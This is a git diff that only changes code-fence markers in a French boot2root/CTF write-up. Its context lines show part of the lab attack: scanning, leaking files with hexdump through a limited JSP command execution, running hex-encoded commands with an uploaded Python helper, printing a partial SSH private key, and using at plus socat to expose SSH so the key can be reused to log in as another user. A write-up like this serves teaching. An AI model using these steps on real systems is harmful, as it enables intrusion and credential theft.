@@ -19,7 +19,7 @@ Un scan sur notre cible ne nous apporte pas grand chose : un port 8080 ouvert et
 
 Le module *Nikto* présent dans *Wapiti* permet de remonter quelques URLs intéressantes :  
 
-```plain
+```
 
 [*] Launching module nikto
 ---
@@ -60,7 +60,7 @@ Comment exfiltrer des données ? Dans un premier temps je me suis tourné vers l
 
 Avec *hexdump -v -x* on peut afficher un fichier sous cette forme (ici avec le début de */etc/services*) :  
 
-```plain
+```
 0000000    2023    654e    7774    726f    206b    6573    7672    6369
 0000010    7365    202c    6e49    6574    6e72    7465    7320    7974
 0000020    656c    230a    230a    4e20    746f    2065    6874    7461
@@ -77,7 +77,7 @@ La première colonne représente l'offset des données dans le fichier. Les autr
 
 Comme on l'a vu précédemment, seules certaines colonnes sont affichées par le script, on aurait donc alors quelque chose comme cela :  
 
-```plain
+```
 X 1  [2]  [3]  [4]  5  6  7  [8]
 X 9  [10] [11] [12] 13 14 15 [16]
 X 17 [18] [19] [20] 21 22 23 [24]
@@ -88,7 +88,7 @@ Avec entre crochets les octets récupérables.
 
 Moyennant un autre hexdump avec un décalage (option -s) on peut compléter :  
 
-```plain
+```
 X 4  [5]  [6]  [7]  8  9  10 [11]
 X 12 [13] [14] [15] 16 17 18 [19]
 X 20 [21] [22] [23] 24 25 26 [27]
@@ -224,7 +224,7 @@ On aurait pu penser alors que le fichier */etc/tomcat8/tomcat-users.xml* contien
 
 A ce stade je note la présence de trois users sur le système :  
 
-```plain
+```
 pollinate:x:111:1::/var/cache/pollinate:/bin/false
 tomcat8:x:112:115::/usr/share/tomcat8:/bin/false
 bill:x:1000:1000:bill,,,:/home/bill:/bash
@@ -277,7 +277,7 @@ for l in x:
 
 Si je peux uploader *pyexec.py* sur le serveur je le converti avec *write\_to\_file.py* :  
 
-```plain
+```
 python write_to_file.py pyexec.py /tmp/pyexec.py
 ```
 
@@ -291,7 +291,7 @@ Il suffit d'appeler *python3 -c* suivi de la chaîne obtenue dans le script JSP 
 
 Maintenant je peux passer des commandes avec autant de redirections, pipe et compagnie que je le souhaite, il suffit de les passer hex-encodés à pyexec :  
 
-```plain
+```
 python3 /tmp/pyexec.py 6c73202d6c
 ```
 
@@ -334,13 +334,13 @@ while True:
 
 Ça permet d'avoir par exemple des infos sur la machine :  
 
-```plain
+```
 Linux b2r 4.10.0-35-generic #39-Ubuntu SMP Wed Sep 13 07:46:59 UTC 2017 x86_64 x86_64 x86_64 GNU/Linux
 ```
 
 ou afficher plus proprement la clé privée SSH :  
 
-```plain
+```
 $ cat /usr/share/tomcat8/.ssh/id_rsa
 -----BEGIN RSA PRIVATE KEY-----
 MIIEoQIBAAKCAQEAsz1zJbcdpjsIoSvCrXi5Al+5oAk47QF27wZWTKEsSkM4RYp8
@@ -375,7 +375,7 @@ Malgré tout ça, rien de bien particulier à ce mettre sous la dents : pas de s
 
 Il y a tout de même l'utilisateur *bill* qui sent bon la poudre :  
 
-```plain
+```
 $ id bill
 uid=1000(bill) gid=1000(bill) groups=1000(bill),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),111(lxd),116(lpadmin),117(sambashare)
 ```
@@ -406,7 +406,7 @@ Maintenant la problématique est de faire exécuter une série de commande via l
 
 *crontab* pourrait le faire mais il faut éditer un fichier... et *at* est présent sur le système. C'est donc aussi simple que :  
 
-```plain
+```
 echo 'kill -9 1415; sleep 5; /tmp/socat TCP4-LISTEN:8080,fork,reuseaddr TCP4:127.0.0.1:22' | at now + 1 minutes
 ```
 
@@ -419,7 +419,7 @@ Sauf que le shell pour *tomcat8* est */bin/false* donc on ne va pas bien loin :D
 
 A moins que bien sûr la clé SSH ait été réutilisée pour l'utilisateur *bill* :  
 
-```plain
+```
 $ ssh -i /tmp/tomcat8_key bill@192.168.1.10 -p 8080
 Welcome to Ubuntu 17.04 (GNU/Linux 4.10.0-35-generic x86_64)
 
